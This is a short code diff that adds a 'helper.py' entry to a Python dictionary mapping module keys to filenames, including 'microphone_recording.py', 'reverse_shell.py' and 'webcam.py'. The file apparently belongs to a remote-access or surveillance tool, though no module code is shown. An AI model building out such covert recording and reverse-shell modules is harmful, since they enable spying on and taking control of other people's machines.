@@ -23,7 +23,8 @@ filenames = {
     'mc_recc': 'microphone_recording.py',
     'process': 'process.py',
     'rev_shl': 'reverse_shell.py',
-    'webcam_': 'webcam.py'
+    'webcam_': 'webcam.py',
+    'hlpr_': 'helper.py'
 }
 
 default_modules = [
